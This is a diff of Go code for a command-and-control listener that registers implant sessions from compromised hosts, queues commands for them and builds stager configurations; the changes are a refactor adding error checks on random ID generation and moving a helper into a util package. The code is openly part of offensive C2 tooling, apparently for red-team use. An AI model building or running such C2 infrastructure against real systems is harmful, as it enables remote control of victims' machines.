@@ -17,6 +17,8 @@ import (
 	"os"
 	"sync"
 	"time"
+
+	"github.com/loudmumble/trusted/pkg/util"
 )
 
 // Listener is the C2 HTTP/HTTPS server that manages implant sessions.
@@ -248,9 +250,11 @@ func (l *Listener) handleCheckin(w http.ResponseWriter, r *http.Request) {
 
 	sessionID := req.SessionID
 	if sessionID == "" || l.sessions[sessionID] == nil {
-		// New session registration
 		b := make([]byte, 16)
-		rand.Read(b)
+		if _, err := rand.Read(b); err != nil {
+			http.Error(w, "failed to generate session ID", http.StatusInternalServerError)
+			return
+		}
 		sessionID = hex.EncodeToString(b)
 
 		l.sessions[sessionID] = &ImplantSession{
@@ -266,7 +270,7 @@ func (l *Listener) handleCheckin(w http.ResponseWriter, r *http.Request) {
 			Metadata:    req.Metadata,
 		}
 		fmt.Printf("[+] New session: %s (%s@%s %s/%s) from %s\n",
-			shortID(sessionID), req.Username, req.Hostname, req.OS, req.Arch, r.RemoteAddr)
+			util.ShortID(sessionID), req.Username, req.Hostname, req.OS, req.Arch, r.RemoteAddr)
 	} else {
 		// Update existing session
 		sess := l.sessions[sessionID]
@@ -400,7 +404,11 @@ func (l *Listener) handleQueueCommand(w http.ResponseWriter, r *http.Request) {
 	}
 
 	b := make([]byte, 8)
-	rand.Read(b)
+	if _, err := rand.Read(b); err != nil {
+		l.mu.Unlock()
+		http.Error(w, "failed to generate command ID", http.StatusInternalServerError)
+		return
+	}
 	cmdID := hex.EncodeToString(b)
 
 	cmd := QueuedCommand{
@@ -438,12 +446,8 @@ func (l *Listener) handleGetResults(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(results)
 }
 
-// shortID safely truncates an ID string to 8 chars for logging.
 func shortID(id string) string {
-	if len(id) > 8 {
-		return id[:8]
-	}
-	return id
+	return util.ShortID(id)
 }
 
 func (l *Listener) sessionCount() int {
@@ -452,10 +456,11 @@ func (l *Listener) sessionCount() int {
 	return len(l.sessions)
 }
 
-// GenerateStagerConfig creates a stager configuration for implant deployment.
 func GenerateStagerConfig(c2URL string) *StagerConfig {
 	b := make([]byte, 16)
-	rand.Read(b)
+	if _, err := rand.Read(b); err != nil {
+		panic(fmt.Sprintf("failed to generate random ID: %v", err))
+	}
 	return &StagerConfig{
 		ID:       hex.EncodeToString(b),
 		C2URL:    c2URL,
@@ -551,7 +556,6 @@ func (l *Listener) ListSessions() []*ImplantSession {
 	return sessions
 }
 
-// QueueCommand queues a command for a session and returns the command ID.
 func (l *Listener) QueueCommand(sessionID, command, args string) (string, error) {
 	l.mu.Lock()
 	defer l.mu.Unlock()
@@ -564,7 +568,9 @@ func (l *Listener) QueueCommand(sessionID, command, args string) (string, error)
 	}
 
 	b := make([]byte, 8)
-	rand.Read(b)
+	if _, err := rand.Read(b); err != nil {
+		return "", fmt.Errorf("generate command ID: %w", err)
+	}
 	cmdID := hex.EncodeToString(b)
 
 	cmd := QueuedCommand{
